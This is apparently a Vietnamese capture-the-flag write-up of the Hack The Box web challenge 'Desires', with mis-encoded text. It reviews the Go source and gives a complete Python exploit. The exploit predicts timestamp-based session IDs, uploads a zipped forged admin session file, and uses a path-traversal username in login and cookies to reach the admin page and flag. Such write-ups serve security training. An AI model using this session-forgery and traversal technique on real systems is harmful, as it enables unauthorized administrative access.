---
layout: post
title:  "Desires HTB"
date:   2025-08-16 17:47:00 +0700
tags: Writeup WebHTB HTB-Easy
categories: jekyll update
---

# Desires 

## Giao di·ªán web 

### Ph·∫ßn login

![image](https://hackmd.io/_uploads/ByQiYNjdgl.png)

### Ph·∫ßn Register 

![image](https://hackmd.io/_uploads/rJraKViull.png)

Sau khi register v√† login v√†o th√†nh c√¥ng: 

![image](https://hackmd.io/_uploads/SJUycEiOxg.png)

## Review Source Code 

![image](https://hackmd.io/_uploads/HkR7o4o_xl.png)

T√¨m th·∫•y ƒë∆∞·ª£c c√°c endpoint nh∆∞ tr√™n. 

Th·∫•y c√≥ `/admin` nh∆∞ v·∫≠y th√¨ m√¨nh ph·∫£i t√¨m c√°ch ƒë·ªÉ leo quy·ªÅn l√™n admin. 

T√¨m th·∫•y c√≥ 1 file `http.go` 

![image](https://hackmd.io/_uploads/SytPgSjuxl.png)

T·ª´ ƒë√¢y th·∫•y c√≥ n√≥ x√°c ƒë·ªãnh role cho user. 

ƒê·∫øn v·ªõi ph·∫ßn upload c≈©ng l√† ch·ª©c nƒÉng duy nh·∫•t c·ªßa web n√†y. 

![image](https://hackmd.io/_uploads/B1BL-Ssdge.png)

·ªû ƒë√¢y, c√≥ v·∫ª n√≥ c√≥ ch·ª©c nƒÉng gi·∫£i n√©n khi upload 1 file n√©n. 

V√† filename ƒë√£ ƒë∆∞·ª£c d√πng `uuid` th√†nh 1 chu·ªói kh√≥ ƒë·ªçc. Sau ƒë√≥ c·ªông v·ªõi extension c·ªßa t√™n file. 

V√† khi upload th√†nh c√¥ng th√¨ n√≥ s·∫Ω t·∫°o ra 1 folder t√™n l√† `files` n·ªëi v·ªõi `username` c·ªßa user ƒë√≥. R·ªìi ch·ª©a file ƒë√£ n√©n. 

Ki·ªÉm tra b√™n trong docker th√¨ n√≥ nh∆∞ sau: 

![image](https://hackmd.io/_uploads/rkJlXBsOgg.png)

M√¨nh ti·∫øp t·ª•c l·ª•c l·ªçi ti·∫øp trong file `http.go`

![image](https://hackmd.io/_uploads/HJGImHoulg.png)

M√¨nh th·∫•y c√≥ 1 file X√°c th·ª±c ·ªü gi·ªØa Session. ·ªû ƒë√¢y n√≥ d·ª±a v√†o 2 tr∆∞·ªùng l√† `sessioID` v√† `username`. 

![image](https://hackmd.io/_uploads/SJHGNBjuge.png)

Quay l·∫°i ·ªü tr√™n th√¨ t√¨m th·∫•y 1 h√†m `LoginHandler` 

![image](https://hackmd.io/_uploads/SyMANBsOle.png)

V√† minh t√¨m th·∫•y 1 file n·ªØa l√† `sessions.go` 

![image](https://hackmd.io/_uploads/BkcOtBjOle.png)

Trong file n√†y c√≥ ph·∫ßn t·∫°o session v√† folder ƒë·ªÉ th·ª±c hi·ªán ƒëi·ªÅu n√†y l√† `/tmp/sessiosns/` n·ªëi v·ªõi `username`, trong ƒë√≥ c√≥ ch·ª©a 1 file session nh∆∞ng ƒë√£ b·ªã thay ƒë·ªïi. 

![image](https://hackmd.io/_uploads/rkbTFHo_gx.png)

File n√†y ch·ªâ r√µ t√™n user v√† c·∫£ role c·ªßa n√≥.

![image](https://hackmd.io/_uploads/BJOe9rjdlg.png)

Ti·∫øp theo, c√≥ h√†m `GetSession` c√≥ ch·ª©c nƒÉng `ReadFile` n√≥ ƒë·ªçc t·ª´ file session d·ª±a v√†o folder `/tmp/sessions/username/sessionID` 

M√† `sessionID` ƒë∆∞·ª£c t·∫°o ra t·ª´ ƒë√¢y.
```go=
sessionID := fmt.Sprintf("%x", sha256.Sum256([]byte(strconv.FormatInt(time.Now().Unix(), 10))))
``` 
D√≤ng n√†y cho bi·∫øt l√† n√≥ t·∫°o session d·ª±a v√†o th·ªùi gian theo t·ª´ng gi√¢y. 

Nh∆∞ v·∫≠y, n·∫øu m√¨nh t·∫°o ra 1 session trong qu√° kh·ª© sau ƒë√≥ upload c√°c file session c√≥ role admin th√¨ ƒë√£ c√≥ th·ªÉ v√†o endpoint `/admin`. 

![image](https://hackmd.io/_uploads/HkP3dLidge.png)

M√¨nh vi·∫øt m·ªôt script ƒë·ªÉ t·∫°o ra 10 `session_id` kh√°c nhau, v·ªõi th·ªùi gian ƒë∆∞·ª£c l√πi d·∫ßn t·ª´ 0 ƒë·∫øn 9 gi√¢y so v·ªõi th·ªùi ƒëi·ªÉm hi·ªán t·∫°i (Unix timestamp).

![image](https://hackmd.io/_uploads/SyGNtLodxl.png)

Trong m·ªói file s·∫Ω ch·ª©a l√†: 

![image](https://hackmd.io/_uploads/S1v9F8suxx.png)

Nh∆∞ng nh·∫≠n th·∫•y r·∫±ng m√¨nh khai th√°c theo ki·ªÉu l√πi ng∆∞·ª£c l·∫°i th√¨ s·∫Ω r·∫•t kh√≥ th√†nh c√¥ng. 

Cho n√™n m√¨nh s·∫Ω khai th√°c theo ki·ªÉu ƒëo√°n tr∆∞·ªõc t∆∞∆°ng l·∫°i nhennn. M√¨nh v·∫´n c√≥ th·ªÉ th·ª±c hi·ªán th·ªß c√¥ng nh∆∞ng m√¨nh s·∫Ω nh·ªù python ƒë·ªÉ l√†m ƒëi·ªÅu n√†y. 

```python
import hashlib
import json 
import os 
import re 
import time 
import zipfile
from datetime import datetime, timedelta 
import requests 

# ======================= CONFIG ==================== 
BASE_URL = "http://localhost:1337"
USERNAME = "abc"
PASSWORD = "abc"
EXPLOIT_USERNAME = f"../../../../../app/service/files/{USERNAME}"
# ==================================================== 

s = requests.Session() 

def predict_session_ids(target_time):
   ts = int(target_time.timestamp())
   return hashlib.sha256(str(ts).encode()).hexdigest()

def create_fake_session_files(session_id, output_dir="./exploit"):
    os.makedirs(output_dir, exist_ok=True)
    content = {"username":"test","id":1,"role":"admin"}
    path = os.path.join(output_dir, session_id)
    with open(path, "w") as f:
        json.dump(content, f)
    return path 

def create_zip(file_path, zip_path="./exploit/exploit.zip"):
    with zipfile.ZipFile(zip_path, "w") as zipf: 
        zipf.write(file_path, os.path.basename(file_path))
    return zip_path 

def register_account(username, password):
    return requests.post(f"{BASE_URL}/register", json={"username":username, "password":password})

def login(username, password):
    return requests.post(f"{BASE_URL}/login", json={"username":username, "password":password}, allow_redirects=False)

def upload_zip(cookies, zip_path):
    with open(zip_path, "rb") as f:
        files = {"archive": ("payload.zip", f, "application/zip")}
        return requests.post(f"{BASE_URL}/user/upload", files=files, cookies=cookies)

def trigger_session_storage(target_time):
    wait_s = (target_time - datetime.now()).total_seconds()
    if wait_s > 0:
        print(f"‚úÖ Waiting {wait_s:.2f}s until {target_time} ...")
        time.sleep(wait_s)
    data = {"username": EXPLOIT_USERNAME, "password":"x"}
    return requests.post(f"{BASE_URL}/login", json=data)

def access_admin_page(username, password):
    print(f"‚ú® Logging in with regular account: {username}")
    login_data = {
        "username": username,
        "password": password
    }
    login_response = requests.post(f"{BASE_URL}/login", json=login_data, allow_redirects=False)
    if login_response.status_code != 302:
        print(f"‚ùå Login failed with status code: {login_response.status_code}")
        return 
    cookies = login_response.cookies
    session_cookie = cookies.get('session')
    username_cookie = cookies.get('username')
    
    print(f"‚úÖ Successfully logged in - Session: {session_cookie}, Username: {username_cookie}")
    
    cookies_dict = {
        "session": session_cookie,
        "username": EXPLOIT_USERNAME
    }
    print(f"‚ú® Modified cookies: {cookies_dict}")
    print(f"‚ú® Refreshing session with modified cookies....")
    refresh_url = f"{BASE_URL}/user/upload"
    refresh_response = requests.get(refresh_url, cookies=cookies_dict)
    
    print(f"‚ú® Accessing admin page....")
    admin_url = f"{BASE_URL}/user/admin"
    admin_response = requests.get(admin_url, cookies=cookies_dict)
    
    print(f"‚ú® Admin page response status: {admin_response.status_code}")
    
    if "HTB" in admin_response.text:
        print(f"‚úÖ Successfully accessed admin page!")
        import re 
        flag_match = re.search(r"HTB\{[^}]+\}", admin_response.text)
        if flag_match: 
            flag = flag_match.group(0)
            print(f"‚úÖ Flag: {flag}")
        else:
            print("‚ú® Flag format detected but couln't extract exact pattern")
            return True
    else:
        print(f"‚ùå No Flag found in response")
        return False
    


def main():
    print("üß™ Preparing exploit...")
    
    # 1) Ch·ªçn th·ªùi ƒëi·ªÉm target (ph√∫t k·∫ø ti·∫øp, gi√¢y = 0)
    now = datetime.now()
    target_time = (now + timedelta(minutes=1)).replace(second=0, microsecond=0)
    print("‚ú® Target time: ", target_time)

    # 2) D·ª± ƒëo√°n sessionID
    sid = predict_session_ids(target_time)
    print("‚ú® Predicted sessionID: ", sid)
    
    # 3) t·∫°o file session gi·∫£ 
    fpath = create_fake_session_files(sid)
    zpath = create_zip(fpath)

    # 4) ƒëƒÉng k√Ω + login aacount th·∫≠t 
    register_account(USERNAME, PASSWORD)
    r = login(USERNAME, PASSWORD)
    if r.status_code != 302: 
        print("‚ùå Login failed")
        return 
    cookies = r.cookies
    
    # 5) upload payload zip 
    ur = upload_zip(cookies, zpath)
    print(f"‚ú® Upload status:", ur.status_code)
    
    # 6) ch·ªù t·ªõi ƒë√∫ng th·ªùi ƒëi·ªÉm -> trigger session storage 
    trigger_session_storage(target_time)
    
    time.sleep(2)

    # 7) Truy c·∫≠p admin page 
    access_admin_page(USERNAME, PASSWORD)
    
    
if __name__ == "__main__":
    main()

```
![image](https://hackmd.io/_uploads/SJiona6_ee.png)

Nh∆∞ v·∫≠y m√¨nh ƒë√£ extract Flag th√†nh c√¥ng!! 

![image](https://hackmd.io/_uploads/Bkp6bJCuex.png)

